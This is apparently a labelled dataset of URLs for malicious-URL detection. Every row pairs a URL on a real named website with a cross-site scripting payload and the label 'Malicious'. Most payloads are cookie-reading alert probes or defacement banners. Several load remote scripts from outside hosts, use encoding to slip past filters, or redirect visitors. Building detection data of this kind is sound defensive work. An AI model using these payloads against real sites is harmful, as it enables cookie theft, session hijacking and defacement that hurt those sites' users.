http://buyersguide.eweek.com/company/listcompaniesbysite.asp?getlistby=%22%3e%3cscript%3ealert(%22by<br>%20encore%20!%22)%3c/script%3e,Malicious
http://www.nord-amerika-suche.de/cgi-bin/links/search.cgi?query=%3cscript%3ealert('the_miller')%3c/s<br>cript%3e,Malicious
http://www.dailycamera.com/portlet/article/html/fragments/email_article.jsp?article=14121857&amp;hostnam<br>e=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;section=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;siteid=&quot;&gt;&lt;script&gt;alert(1);&lt;/scri<br>pt&gt;&amp;&amp;sitename=&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.sogou.com/sohu?query=%22%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fs.js%3e%3c%2fscrip<br>t%3e,Malicious
http://www.liteau.ecologie.gouv.fr/recherche.php?recherche=%22%3e'%3e%3cscript%20src=http://vuln.xss<br>ed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.checkpad.jp/?login_email='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://www3.comune.reggio-calabria.it/fotogallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://architectuurfocus.ugent.be/unavailable.aspx?ref=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e&amp;lang=nl&amp;alias=,Malicious
http://www.stenhuset.dk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.total-knockout.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://buyersguide.baselinemag.com/bguide/company/listcompaniesbysite.asp?page=13&amp;cbopagesize=&amp;getli<br>stby=%22%3e%3cscript%3ealert(%22xssed_by_omeha%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e,Malicious
http://www.sdpc.gov.cn/search/searchresultnew.jsp?searchword1=%22%3e%3cscript%3ealert%281%29%3c%2fsc<br>ript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_wa<br>s_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%<br>2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols<br>%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%<br>3e%3cnoscript%3e%3cplaintext%3e&amp;submit122=++%b2%e9+%d1%af&amp;searchword=%22%3e%3cscript%3ealert%a3%a81%<br>a3%a9%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%a3%a8%22kaksii_was_here%22%a3%a9%3cscript%3ea<br>lert%a3%a8%27kaksii_was_here%27%a3%a9%3balert%a3%a81%a3%a9%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%<br>3cscript%3ealert%a3%a810111%a3%a9%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d<br>4%3e%3ctextarea%2520name%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c<br>%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;channelid=75009&amp;prechannelid=,Malicious
http://planetsourcecode.com/vb/timeout/sessiontimeout.asp?txtreturnurl=/vb/scripts/browsecategoryors<br>earchresults.asp&amp;txtparms=txtcriteria=%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22<br>%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.co<br>okie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3csc<br>ript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://blog.nbhq.gov.cn/uchome/app.php?id=1&amp;uid=1%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.nntt.gov.au/pages/search.aspx?k=error%3cscript%20language=javascript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious
http://www.positive-life.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://india.gov.in/howdo/onlineservice_detail.php?service=104%22%3e%3e%3c/script%3e%3cscript%3ealer<br>t(document.cookie)%3c/script%3e,Malicious
http://www.planetsearch.com.au/search?q=enten.win.mofcom.gov.cn%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.iiar-anticancer.org/search.php?srch=""><script>alert(document.cookie)</script>&x=0&y=0",Malicious
http://www.jungleway.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bienaldecomunicacion.org/search_result.asp?search_text=%22%3e%3cscript+src%3dhttp%3a%2f%2<br>fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c%2fscript%3e&amp;submit=buscar,Malicious
http://www.no-fortress-europe.eu/showpage.jsp?id=%3cscript%3ealert(%22xroot%20owned%20you!%22)%3c/sc<br>ript%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3exroot,Malicious
http://www.control2000.de/nweb/suche.asp?q=%22%3e%3cscript%3ealert(%22pwnd%20for%20big-h%20yo%20(;%2<br>2)%3c/script%3e,Malicious
"http://www.mpr.gov.ba/en/trazi.asp?trazi=/""><script>alert(1)</script>&imagefield.x=31&imagefield.y=22",Malicious
http://www.discoverireland.com/gb/search/?q=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6<br>d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e&amp;submit.x=10&amp;submit.y<br>=6,Malicious
http://www.globalfreecash.com/reg.asp?refcode=sirveu@yahoo.com%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pcworld.be/fr/fiches/news/security/een-virus-voor-mac-os-x.cfm?comments=&quot;&gt;&lt;script&gt;alert(&quot;<br>maxwel&quot;)&lt;/script&gt;,Malicious
http://deinetitelseite.bild.de/?a=preview&amp;first=zur&amp;last=%20xss-luecke%22%3e%3cscript%3ealert%28docu<br>ment.cookies%29%3c/script%3e&amp;filename=koala.jpg&amp;page=1&amp;birthday=12.06.2011%27&amp;artikel1=,Malicious
http://www.wowprogress.com/search?q=%27%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.qualite-tourisme.gouv.fr/impression.php?nbi=%22%3e'%3e%3cscript%20src=http://vuln.xssed.n<br>et/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.zjwsw.gov.cn/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious
http://www.hapimagtesisleri.com/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tk5ep.free.fr/alex_guestbook4/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://w2000.dic.at/phpinfo.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.weboglasi.net/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.satinrosedesigns.com/paradis/gallery/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.fling.com/main.php?gender=&amp;country_code=fr&amp;location_id=&amp;is_active=0&amp;position=0&amp;bmon=&amp;bday<br>=&amp;byear=--&amp;email=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscript%3e&amp;username=&amp;passwor<br>d=&amp;process=validate&amp;a=user.register_iframe&amp;advert=enoramedia&amp;prg=1&amp;id=enoramedia&amp;tour=search&amp;cmp=xvi<br>d_928_1103_foot2&amp;ad_id=&amp;jf=&amp;act=register&amp;io_bb=0400gggkvt2dadm%2fyovibnjaiulaq1gpxgzlxavi0%2bfsdukak<br>zttorgnxz3ciai%2bm26%2bhqchlco4fslz17engle7xxqlwrnjn5m7jxhnifkxyhfqbz9hsabtxfbpae97i9s835cciofilx0ed<br>y3kusarrign0c4lgbdglmd7i2jbchnwpppv0zsmv8%2fpvayuo0neau1bzknc3nz9nrvffcdivoh9b7nkzd0ikc1qok6fc4ev5go<br>w%2bggehsqpcd6ksm4zr2cgxyt3j07d6wf1rrmlegrbx1csx7ku4cfkx6r7pix%2fczwvdpetn9eyklwivh4flvmshr9mfc1xocu<br>htjivrr%2fxjr7mr0wvcjvmjkbp4svfl0zmzd89caae4cnuffskwkr0mf%2bogwyqnlduaqcv8aea3iga4xxla9yimzswhz36yc%<br>2f35jahdfxg8dz%2f%2b4rjtgf6yeu%2bpkuq1v99pkbony1znntcmg8xjbn5bbnvllrnykrsb%2fczmgvlegjlsdpvuwllnte9q<br>pxdmbcprcsymf6hi7s1fwsm%2bmdvmy%2bh9ul1t13mzgt5n3e7nvrnswkyzsgzjdagffoe185ecboa%2brfpbqgc%2f4yijmpxd<br>wdxjzqnzqtbxtgjnwtb4skz3v7ahz5pwpttl3ejzmvgme3auwn2ukioajcihxk5cjotasm4gac32%2fbwe8mpsvk6dtjaa24wper<br>zpoianloa2fqfhxa%2bk9xrliy%2fun1h6iltepjfmwyi1wer%2fbu5%2fduwsacq6c1nptkhjzjn2vzc1yo77chilblq6eshdan<br>5moivmsn%2f%2bl1k8eixka%3d%3d&amp;bgcolor=transparent&amp;font_color=000000&amp;font_family=verdana&amp;button_text=<br>see+me+naked,Malicious
http://www.storforsen-hotell.se/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.reverso.net/text_translation.asp?lang=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.ojjdp.ncjrs.gov/exit.asp?url=%3c%3cscript%3ealert(%22xss%20|%20hexspirit%22);//%3c%3c/scr<br>ipt%3e,Malicious
http://msn.xyinlove.co.kr/xycomm/reporter_view.asp?pkey=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://city.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat%20harutyunyan;&amp;o=%22<br>%3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;l=dir,Malicious
http://berlin.mfa.gov.il/mfm/web/search/search.asp?question=totalschaden%22%3e%3cbr%3e%3cimg%20src=h<br>ttp://www.cynical-c.com/archives/bloggraphics/22.jpg%3e&lt;body<br>onload=alert(/xss/)&gt;&amp;subjectid=&amp;missionid=88&amp;languageid=0&amp;from_day=&amp;from_month=&amp;from_year=&amp;to_day=&amp;t<br>o_month=&amp;to_year=&amp;period=&amp;maxresult=10,Malicious
http://www.sciencedomain.org/editorial-board-members.php?id=6%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,Malicious
"http://www.norman.com/support/support_issue_archive/67744/en?msg:utf8:ustring=%22%3e%3cscript%3ealer<br>t(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.ucuncuel.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scr<br>ipt&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.oprah.com/search/search_results.jsp?origin=60&amp;brand=oprah&amp;qsource=1&amp;querystring=%3cscript<br>%3ealert%28%27cueballr%27%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3ecue&amp;fromsearchpage=yes&amp;go.x=0&amp;go.y=0,Malicious
http://www.angleseywalkingfestival.com/guest/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gaffur-fan.net/test/php/php_info.php?a[]=%3cscript+src=http://starext.by.ru/lt.js%3e,Malicious
http://www.partypoker.com/tournaments/schedule.htm?pagenum=1&amp;sortby=time&amp;isasc=asc&amp;torncat=&amp;gametype<br>=&amp;limittype=&amp;startbuyin=&amp;endbuyin=&amp;startsin=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://cardealerforums.com/car-dealer-forum-news/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://search.greenbaypressgazette.com/sp?aff=1100&amp;skin=&amp;keywords=%22%3e%3cscript%3ealert(document.c<br>ookie)%3c/script%3e,Malicious
http://www.tt-intl.com/products/display_products.cfm?itemno=ts-a6947&amp;category1=others&amp;category2=car_<br>audio&amp;category3=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious
"http://find.in.gr/index.php?q=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcharcode(8<br>8,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3<br>e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.shuangyang.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p<br>+,Malicious
http://h.ula.cc/dance/?kenken=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://mappn.com/game.php?id=18%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://search.henan.gov.cn/szxx/c_search1.jsp?p=%3c%2fscript%3e%3cscript%3ealert%28&quot;xss&quot;%29%3c%2fscr<br>ipt%3e,Malicious
http://www.all-horse-classifieds.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://admin.stage.att.net/bellsouth/s/s.dll?spage=%27;alert%28string.fromcharcode%2888,83,83%29%29//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%29//\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e%22%3e",Malicious
http://biclopsgames.com/gameframe.php?id=7%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.gouv.mc/devwww/wwwnew.nsf/docsearchview?searchview&amp;query=wawa%27%3e%3cscript%3ealert(123)<br>%3c/script%3e&amp;lang=gb&amp;count=wawa&amp;searchmax=wawa,Malicious
http://w1.siemens.com/apps/search/en/index.php?uil=en&amp;cs=corp_siemens&amp;treepos=corp_siemens&amp;collapse=<br>true&amp;class=search%2cbanner%2ctext&amp;q=%3cscript%3ealert(0)%3c%2fscript%3e&amp;search.x=0&amp;search.y=0,Malicious
http://www.tauchin.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.apc.com/prod_docs/results.cfm?doctype=app+note&amp;query_type=99&amp;keyword=&quot;&gt;&lt;iframe<br>src=&quot;http://xssed.com&quot;&gt;,Malicious
http://www.tas.gov.au/tasmaniaonline/titleindex/default.asp?page=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;,Malicious
http://www.issh.gov.al/index.php?faqe=kerko&amp;metod=prekerko&amp;keywords=%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit=ok,Malicious
"http://www.faith-go.co.jp/lists/viewitem_soft.asp?cid=000%22%3e'%3e%3c/script%3e%3cscript/src=http:/<br>/kusomiso.com/xss.js%3e%3c/script%3e26&amp;fl=1,2,3&amp;hid=&amp;list=new&amp;id=000000200520755",Malicious
"http://www.gameforge.de/content/view/95/54/lang,&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;/",Malicious
http://vesti.krstarica.com/?rubrika=aktuelno&amp;lang=0&amp;sifra=%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e&amp;dan=01&amp;mesec=09&amp;godina=2009%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://orpheus.nascom.nasa.gov/~zarro/php/ssw_print.php?file=%%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%<br>2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.nauroder.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.clago.ca/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/<br>marquee&gt;,Malicious
http://www.excelencias.org.br/@busca.php?nome=%3cscript%20src=http://mygot.110mb.com/lol.js%3e%3c/sc<br>ript%3e,Malicious
http://www.sba.gov/cgi-bin/byebye.pl?to=%3cscript%3ealert(%22kaksii%20was%20here%22)%3c/script%3e,Malicious
http://www.pmpf.rs.gov.br/interna.php?f_f_form_submitted=1&amp;f_search=%22%3e%27%3e%3cscript+src%3dhttp<br>%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
http://www.eu-un.europa.eu/home/search.asp?showform=no&amp;query=&amp;lg=%3e%22%3cscript%3ealert(document.co<br>okie)%3c/script%3e,Malicious
http://www.andoutdoor.com/default.asp?sayfa=urun1&amp;kategori=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://ym.to/i/m/search.cgi?ky=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3<br>c%2fscript%3e&amp;sp=1&amp;md=1,Malicious
"http://www.saab.bg/test-drajv?form%5bname%5d=111-222-1933email@address.tst&form%5bemail%5d=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious
http://www.one.mc/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhit<br>ehat%20forever%3c/marquee%3e,Malicious
http://www.theglobeandmail.com/servlet/page/document/v5/templates/hub?hub=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;<br>/script&gt;,Malicious
http://www.vodafone.ie/search/search.shtml;jsessionid=2597322b6ff2fa63eb0072f47dfe1ad0?q=search%3a%2<br>2%3cscript%3ealert%28%22xssed%22%29%3c%2fscript%3e%22%3cscript%3ealert%28%22xssed%22%29%3c%2fscript%<br>3e&amp;x=0&amp;y=0,Malicious
http://freehotscript.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.kongregate.com/games/armorgames/%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e,Malicious
http://www.president.al/english/pub/kerko.asp?kerkimi=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://fr.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,Malicious
http://secure.digitallook.com/cgi-bin/digitalcorporate/msn/market_bar_charts.cgi?action=&amp;username=&amp;a<br>c=&amp;csi=&amp;classification_id=averages&amp;average_type=mean&amp;dataplotcatergory=share_performance&amp;data_point=<br>price_mvt_30d&amp;orderby=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.ddlvista.com/search.php?qry=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);%3c/sc<br>ript%3e,Malicious
http://www.coopercenter.org/search.php?s=%3c%2ftitle%3e%3cscript%3ealert%28%22resistance%22%29%3b%3c<br>%2fscript%3e,Malicious
http://store.esri.com/esri/search.cfm?sid=2&amp;keywords=fooz%22%3cscript%3ealert('xssed');%3c/script%3e,Malicious
http://www.mikegolding.com/?pg=media&amp;type=&quot;&gt;&lt;script<br>src=http://byccc.awardspace.com/js/xssccc.js&gt;&lt;/script&gt;,Malicious
http://www.veloute.fr/fruix-ton-sourire/%3c%3cscript%3ealert%28%22vache%20qui%20rit%20!%22%29;//%3c%<br>3c/script%3e,Malicious
http://indiannations.visitmt.com/categories/primary.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br>script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://e.www1.xwjp.com/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://www.switchboard.com/ottw.1374/dir/rpresults.htm?sr=&amp;mem=1374&amp;ypcobrand=1374&amp;type=both&amp;qv=&amp;ph=<br>%22%3e'%3e%3cscript%3ealert(123)%3c/script%3e%22'&amp;submit1=search,Malicious
http://www.jeuxvideo.com/concours/concours-so-blonde-7.php?pseudo='%22%3e%3c/title%3e%3cscript%3eale<br>rt(1337)%3c/script%3e'%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3cbr/%3exss%20by%20xylitol%3cbr/<br>%3exss%20by%20xylitol%3cbr/%3exss%20by%20xylitol%3cbr/%3exss%20by%20xylitol%3cbr/%3exss%20by%20xylit<br>ol%3cbr/%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;question_14=reponse_50&amp;question_15=reponse_54&amp;q<br>uestion_16=reponse_58&amp;question_17=reponse_62#erreur,Malicious
http://www.euroinfo.gov.sk/index/go.php?h_text=%22%3e%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoder<br>s.com%2fxss.js%3e&amp;od_den=21&amp;od_mesiac=9&amp;od_rok=2007&amp;do_den=5&amp;do_mesiac=10&amp;do_rok=2007&amp;id=13&amp;submitte<br>d=1&amp;prm1=0&amp;prm2=14,Malicious
http://aviation-safety.net/news/news.php?var=200310%25&amp;sort=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.intellinet-cars.com/cro/posalji_mail_dealer_rabljeni.asp?naziv_dealera=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sousuo.gov.cn/gw_js/en/tp_index.jsp?query=%3c!--%3ca%20href=%22-%20--%3e%3ca%20href=http://im<br>g181.imageshack.us/img181/9853/reporterssansfrontieresro4.jpg%3e%3cmarquee%3e%3ch1%3efree%20tibet%20<br>by%20p3lo%3c/h1%3e%3c/marquee%3e%3cscript%3ealert('tibet%20libre')%3c/script%3e--%3e,Malicious
http://www.body-on-line.de/galerie/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.adpnettuno.it/album/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.munich-airport.de/de/consumer/fluginfo/airlines/%3c%22%3c%3cscript%3ealert%281%29%3c/scri<br>pt%3e/index.jsp,Malicious
http://www.hotels-petersburg-russia.com/includes/setdate.php?year=2008&amp;month=09&amp;u=&amp;day=27&amp;hour=12&amp;ty<br>pe=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%<br>72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%3<br>0%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63<br>%72%69%70%74%3e%0a,Malicious
http://www.viltdata.se/default.asp?pageid=22084&amp;path=&amp;oewcmd=4&amp;id=124&amp;query=%27%3e%3cscript%3ealert(<br>123)%3c%2fscript%3e,Malicious
http://eosweb.larc.nasa.gov/cgi-bin/searchtool.cgi?dataset=&quot;&gt;&lt;script&gt;alert&quot;&gt;&lt;script&gt;alert(1337)&lt;/scr<br>ipt&gt;(1337)&quot;&gt;&lt;script&gt;&quot;&gt;&lt;script&gt;alert(1337)&lt;/script&gt;alert(1337)&lt;/script&gt;&lt;/script&gt;,Malicious
http://www.ncbi.nlm.nih.gov/ieb/research/acembly/av.cgi?db=human&amp;ctx=ctx-28122-berg-5172&amp;q=%3cscript<br>%3ealert(%22iblaze%22)%3c%2fscript%3e&amp;n=0,Malicious
http://www.educating.net/search.asp?start=1&amp;category=k12&amp;search=%22%3e%3cscript%3ealert%28%22pwnd+fo<br>r+big-h+yo+%28%3b%22%29%3c%2fscript%3e&amp;subcategory=0,Malicious
http://tv.msn.co.kr/enter/mvholic/info/image_view.html?_movieid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.corrientes.gov.ar/mercedes/formmail.asp?to=escuela_parroquial@yahoo.com.ar%27%22%3e%3c/ti<br>tle%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%<br>3c/marquee%3e,Malicious
http://www.bdangouleme.com/index.php?msgerreurnl=l%27email+est+inv%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ealide,Malicious
http://www.pendrell-hall.org.uk/search.php?field=name&amp;query=%22%3e%27%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e,Malicious
http://en.netlog.com/balkan_sweet_angel/photo/photoid=11339745&quot;&gt;&lt;script&gt;alert(/airroxssed/);&lt;/script<br>&gt;,Malicious
"http://anno.es.ubi.com/pc/media1404.php?gallery=media1404&amp;picture=%27%22%3e%3cscript%3ealert%28strin<br>g.fromcharcode%2888,83,83,69,68,32,98,121,32,86,105,112,101,114,46,97,84%29%29;document.write%28stri<br>ng.fromcharcoe%2860,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,120,115,115,101,100,46,99,1<br>11,109,47,97,114,99,104,105,118,101,47,97,117,116,104,111,114,61,86,105,112,101,114,46,97,84,47,34,6<br>2,88,83,83,69,68,60,47,97,62%29%29;%3c/script%3e",Malicious
